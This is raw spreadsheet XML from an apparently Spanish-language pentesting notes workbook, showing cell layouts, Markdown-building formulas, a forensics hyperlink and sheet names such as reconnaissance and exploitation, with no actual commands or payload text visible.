      <c r="F7" s="14" t="s">
        <v>187</v>
      </c>
      <c r="G7" s="16" t="s">
        <v>2</v>
      </c>
      <c r="H7" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="8" spans="2:12" ht="56.25">
      <c r="B8" s="1"/>
      <c r="C8" s="2"/>
      <c r="D8" s="3"/>
      <c r="F8" s="15" t="s">
        <v>1608</v>
      </c>
      <c r="G8" s="61" t="s">
        <v>1613</v>
      </c>
      <c r="H8" s="11"/>
    </row>
    <row r="9" spans="2:12" ht="67.5">
      <c r="B9" s="1"/>
      <c r="C9" s="2"/>
      <c r="D9" s="3"/>
      <c r="F9" s="28" t="s">
        <v>1609</v>
      </c>
      <c r="G9" s="29" t="s">
        <v>1614</v>
      </c>
      <c r="H9" s="30" t="s">
        <v>1610</v>
      </c>
    </row>
    <row r="10" spans="2:12" ht="33.75">
      <c r="B10" s="1"/>
      <c r="C10" s="2"/>
      <c r="D10" s="3"/>
      <c r="F10" s="25" t="s">
        <v>1611</v>
      </c>
      <c r="G10" s="26" t="s">
        <v>1612</v>
      </c>
      <c r="H10" s="27"/>
    </row>
    <row r="11" spans="2:12" ht="18.75">
      <c r="B11" s="1"/>
      <c r="C11" s="2"/>
      <c r="D11" s="3"/>
    </row>
    <row r="12" spans="2:12" ht="18.75">
      <c r="B12" s="1"/>
      <c r="C12" s="2"/>
      <c r="D12" s="3"/>
    </row>
    <row r="13" spans="2:12" ht="19.5" thickBot="1">
      <c r="B13" s="1"/>
      <c r="C13" s="2"/>
      <c r="D13" s="3"/>
      <c r="F13" s="71" t="s">
        <v>1627</v>
      </c>
      <c r="G13" s="71"/>
      <c r="H13" s="71"/>
    </row>
    <row r="14" spans="2:12" ht="18.75">
      <c r="B14" s="1"/>
      <c r="C14" s="2"/>
      <c r="D14" s="3"/>
      <c r="F14" s="14" t="s">
        <v>187</v>
      </c>
      <c r="G14" s="16" t="s">
        <v>2</v>
      </c>
      <c r="H14" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="15" spans="2:12" ht="22.5">
      <c r="B15" s="1"/>
      <c r="C15" s="2"/>
      <c r="D15" s="3"/>
      <c r="F15" s="15" t="s">
        <v>1628</v>
      </c>
      <c r="G15" s="61" t="s">
        <v>1629</v>
      </c>
      <c r="H15" s="11" t="s">
        <v>1630</v>
      </c>
    </row>
    <row r="16" spans="2:12" ht="18.75">
      <c r="B16" s="1"/>
      <c r="C16" s="2"/>
      <c r="D16" s="3"/>
    </row>
    <row r="17" spans="2:8" ht="19.5" thickBot="1">
      <c r="B17" s="1"/>
      <c r="C17" s="2"/>
      <c r="D17" s="3"/>
      <c r="F17" s="71" t="s">
        <v>1929</v>
      </c>
      <c r="G17" s="71"/>
      <c r="H17" s="71"/>
    </row>
    <row r="18" spans="2:8" ht="18.75">
      <c r="B18" s="1"/>
      <c r="C18" s="2"/>
      <c r="D18" s="3"/>
      <c r="F18" s="14" t="s">
        <v>187</v>
      </c>
      <c r="G18" s="16" t="s">
        <v>2</v>
      </c>
      <c r="H18" s="10" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="19" spans="2:8" ht="22.5" customHeight="1">
      <c r="B19" s="1"/>
      <c r="C19" s="2"/>
      <c r="D19" s="3"/>
      <c r="F19" s="15" t="s">
        <v>1930</v>
      </c>
      <c r="G19" s="61" t="s">
        <v>1931</v>
      </c>
      <c r="H19" s="11"/>
    </row>
    <row r="20" spans="2:8" ht="18.75">
      <c r="B20" s="1"/>
      <c r="C20" s="2"/>
      <c r="D20" s="3"/>
    </row>
    <row r="21" spans="2:8" ht="18.75">
      <c r="B21" s="1"/>
      <c r="C21" s="2"/>
      <c r="D21" s="3"/>
    </row>
    <row r="22" spans="2:8" ht="18.75">
      <c r="B22" s="1"/>
      <c r="C22" s="2"/>
      <c r="D22" s="3"/>
    </row>
    <row r="23" spans="2:8">
      <c r="B23" s="4"/>
      <c r="C23" s="5"/>
      <c r="D23" s="6"/>
    </row>
    <row r="24" spans="2:8">
      <c r="B24" s="4"/>
      <c r="C24" s="5"/>
      <c r="D24" s="6"/>
    </row>
    <row r="25" spans="2:8" ht="19.5" thickBot="1">
      <c r="B25" s="7"/>
      <c r="C25" s="8"/>
      <c r="D25" s="9"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="F17:H17"/>
    <mergeCell ref="B1:D2"/>
    <mergeCell ref="F2:H2"/>
    <mergeCell ref="F13:H13"/>
    <mergeCell ref="J2:L2"/>
    <mergeCell ref="F6:H6"/>
  </mergeCells>
  <hyperlinks>
    <hyperlink ref="F8" r:id="rId1"/>
    <hyperlink ref="F9" r:id="rId2" location="forensic-magnifier" display="https://29a.ch/photo-forensics/ - forensic-magnifier"/>
  </hyperlinks>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait" horizontalDpi="0" verticalDpi="0"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31"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="Q1" sqref="Q1"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultRowHeight="15"/>
  <cols>
    <col min="8" max="8" width="18" customWidth="1"/>
    <col min="17" max="17" width="25" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:19" ht="15.75" thickBot="1">
      <c r="A1" s="72" t="s">
        <v>10</v>
      </c>
      <c r="B1" s="72"/>
      <c r="C1" s="72"/>
      <c r="F1" t="str">
        <f>O$1&amp;B1&amp;P$1</f>
        <v>#</v>
      </c>
      <c r="O1" s="54" t="s">
        <v>882</v>
      </c>
      <c r="P1" s="54"/>
      <c r="Q1" s="54" t="s">
        <v>854</v>
      </c>
      <c r="R1" s="54" t="s">
        <v>854</v>
      </c>
      <c r="S1" s="54" t="s">
        <v>883</v>
      </c>
    </row>
    <row r="2" spans="1:19">
      <c r="A2" s="14" t="s">
        <v>1</v>
      </c>
      <c r="B2" s="16" t="s">
        <v>2</v>
      </c>
      <c r="C2" s="10" t="s">
        <v>3</v>
      </c>
      <c r="F2" t="str">
        <f>O$1&amp;B2</f>
        <v>#Descripcion</v>
      </c>
    </row>
    <row r="3" spans="1:19">
      <c r="A3" s="15"/>
      <c r="B3" s="19"/>
      <c r="C3" s="11"/>
      <c r="F3" t="str">
        <f>O$1&amp;B3</f>
        <v>#</v>
      </c>
      <c r="G3" t="str">
        <f>Q$1&amp;A3&amp;R$1</f>
        <v>``````</v>
      </c>
      <c r="H3" s="11" t="str">
        <f>IF(C3="","",S$1&amp;C3)</f>
        <v/>
      </c>
    </row>
    <row r="4" spans="1:19">
      <c r="A4" s="17"/>
      <c r="B4" s="20"/>
      <c r="C4" s="18"/>
      <c r="F4" t="str">
        <f t="shared" ref="F4:F31" si="0">O$1&amp;B4&amp;P$1</f>
        <v>#</v>
      </c>
      <c r="G4" t="str">
        <f t="shared" ref="G4:G31" si="1">Q$1&amp;A4&amp;R$1</f>
        <v>``````</v>
      </c>
      <c r="H4" s="11" t="str">
        <f t="shared" ref="H4:H31" si="2">IF(C4="","",S$1&amp;C4)</f>
        <v/>
      </c>
    </row>
    <row r="5" spans="1:19">
      <c r="A5" s="15"/>
      <c r="B5" s="21"/>
      <c r="C5" s="12"/>
      <c r="F5" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G5" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H5" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="6" spans="1:19">
      <c r="A6" s="17"/>
      <c r="B6" s="20"/>
      <c r="C6" s="18"/>
      <c r="F6" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G6" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H6" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q6" t="s">
        <v>884</v>
      </c>
    </row>
    <row r="7" spans="1:19" ht="17.25">
      <c r="A7" s="15"/>
      <c r="B7" s="21"/>
      <c r="C7" s="12"/>
      <c r="F7" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G7" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H7" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q7" s="55" t="str">
        <f>IF(C3="","",(C3=S$1&amp;C3))</f>
        <v/>
      </c>
    </row>
    <row r="8" spans="1:19" ht="17.25">
      <c r="A8" s="17"/>
      <c r="B8" s="20"/>
      <c r="C8" s="18"/>
      <c r="F8" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G8" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H8" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q8" s="55" t="str">
        <f t="shared" ref="Q8:Q14" si="3">IF(C4="","",(C4=S$1&amp;C4))</f>
        <v/>
      </c>
    </row>
    <row r="9" spans="1:19" ht="17.25">
      <c r="A9" s="15"/>
      <c r="B9" s="21"/>
      <c r="C9" s="12"/>
      <c r="F9" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G9" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H9" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q9" s="55" t="str">
        <f t="shared" si="3"/>
        <v/>
      </c>
    </row>
    <row r="10" spans="1:19" ht="17.25">
      <c r="A10" s="17"/>
      <c r="B10" s="20"/>
      <c r="C10" s="18"/>
      <c r="F10" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G10" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H10" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q10" s="55" t="str">
        <f t="shared" si="3"/>
        <v/>
      </c>
    </row>
    <row r="11" spans="1:19" ht="17.25">
      <c r="A11" s="15"/>
      <c r="B11" s="21"/>
      <c r="C11" s="12"/>
      <c r="F11" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G11" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H11" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q11" s="55" t="str">
        <f t="shared" si="3"/>
        <v/>
      </c>
    </row>
    <row r="12" spans="1:19" ht="17.25">
      <c r="A12" s="17"/>
      <c r="B12" s="20"/>
      <c r="C12" s="18"/>
      <c r="F12" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G12" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H12" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q12" s="55" t="str">
        <f t="shared" si="3"/>
        <v/>
      </c>
    </row>
    <row r="13" spans="1:19" ht="17.25">
      <c r="A13" s="15"/>
      <c r="B13" s="21"/>
      <c r="C13" s="12"/>
      <c r="F13" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G13" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H13" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q13" s="55" t="str">
        <f>IF(C9="","",S$1&amp;C9)</f>
        <v/>
      </c>
    </row>
    <row r="14" spans="1:19" ht="17.25">
      <c r="A14" s="17"/>
      <c r="B14" s="20"/>
      <c r="C14" s="30"/>
      <c r="F14" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G14" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H14" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q14" s="55" t="str">
        <f t="shared" si="3"/>
        <v/>
      </c>
    </row>
    <row r="15" spans="1:19" ht="17.25">
      <c r="A15" s="15"/>
      <c r="B15" s="21"/>
      <c r="C15" s="12"/>
      <c r="F15" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G15" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H15" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q15" s="55" t="str">
        <f t="shared" ref="Q15" si="4">IF(C11="","","=S$1&amp;C3")</f>
        <v/>
      </c>
    </row>
    <row r="16" spans="1:19" ht="17.25">
      <c r="A16" s="17"/>
      <c r="B16" s="20"/>
      <c r="C16" s="18"/>
      <c r="F16" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G16" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H16" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
      <c r="Q16" s="55" t="str">
        <f t="shared" ref="Q16" si="5">IF(C12="","","HOLA")</f>
        <v/>
      </c>
    </row>
    <row r="17" spans="1:8">
      <c r="A17" s="15"/>
      <c r="B17" s="21"/>
      <c r="C17" s="12"/>
      <c r="F17" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G17" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H17" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="18" spans="1:8">
      <c r="A18" s="17"/>
      <c r="B18" s="20"/>
      <c r="C18" s="18"/>
      <c r="F18" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G18" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H18" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="19" spans="1:8">
      <c r="A19" s="15"/>
      <c r="B19" s="21"/>
      <c r="C19" s="12"/>
      <c r="F19" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G19" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H19" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="20" spans="1:8">
      <c r="A20" s="17"/>
      <c r="B20" s="20"/>
      <c r="C20" s="18"/>
      <c r="F20" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G20" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H20" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="21" spans="1:8">
      <c r="A21" s="15"/>
      <c r="B21" s="21"/>
      <c r="C21" s="12"/>
      <c r="F21" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G21" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H21" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="22" spans="1:8">
      <c r="A22" s="17"/>
      <c r="B22" s="20"/>
      <c r="C22" s="18"/>
      <c r="F22" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G22" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H22" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="23" spans="1:8">
      <c r="A23" s="15"/>
      <c r="B23" s="21"/>
      <c r="C23" s="12"/>
      <c r="F23" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G23" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H23" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="24" spans="1:8">
      <c r="A24" s="17"/>
      <c r="B24" s="20"/>
      <c r="C24" s="18"/>
      <c r="F24" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G24" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H24" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="25" spans="1:8">
      <c r="A25" s="15"/>
      <c r="B25" s="21"/>
      <c r="C25" s="12"/>
      <c r="F25" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G25" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H25" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="26" spans="1:8">
      <c r="A26" s="17"/>
      <c r="B26" s="20"/>
      <c r="C26" s="18"/>
      <c r="F26" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G26" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H26" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="27" spans="1:8">
      <c r="A27" s="15"/>
      <c r="B27" s="21"/>
      <c r="C27" s="12"/>
      <c r="F27" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G27" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H27" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="28" spans="1:8">
      <c r="A28" s="17"/>
      <c r="B28" s="20"/>
      <c r="C28" s="18"/>
      <c r="F28" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G28" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H28" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="29" spans="1:8">
      <c r="A29" s="15"/>
      <c r="B29" s="21"/>
      <c r="C29" s="12"/>
      <c r="F29" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G29" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H29" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="30" spans="1:8">
      <c r="A30" s="17"/>
      <c r="B30" s="20"/>
      <c r="C30" s="18"/>
      <c r="F30" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G30" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H30" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
    <row r="31" spans="1:8">
      <c r="A31" s="15"/>
      <c r="B31" s="21"/>
      <c r="C31" s="12"/>
      <c r="F31" t="str">
        <f t="shared" si="0"/>
        <v>#</v>
      </c>
      <c r="G31" t="str">
        <f t="shared" si="1"/>
        <v>``````</v>
      </c>
      <c r="H31" s="11" t="str">
        <f t="shared" si="2"/>
        <v/>
      </c>
    </row>
  </sheetData>
  <mergeCells count="1">
    <mergeCell ref="A1:C1"/>
  </mergeCells>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Inicio</vt:lpstr>
      <vt:lpstr>General</vt:lpstr>
      <vt:lpstr>Reconocimiento &amp; Informacion</vt:lpstr>
      <vt:lpstr>Enumeracion &amp; Escaneos</vt:lpstr>
      <vt:lpstr>Explotacion &amp; Post-Explotacion</vt:lpstr>
      <vt:lpstr>Interceptadores &amp; Web</vt:lpstr>
      <vt:lpstr>Inyecciones</vt:lpstr>
      <vt:lpstr>Wireless</vt:lpstr>
      <vt:lpstr>Red Team</vt:lpstr>
      <vt:lpstr>Reversing &amp; Forensics</vt:lpstr>
      <vt:lpstr>Parseo Gitbook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dc:creator>
  <cp:lastModifiedBy>K.L</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-04-02T10:13:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-07-22T21:30:25Z</dcterms:modified>
</cp:coreProperties>
</file>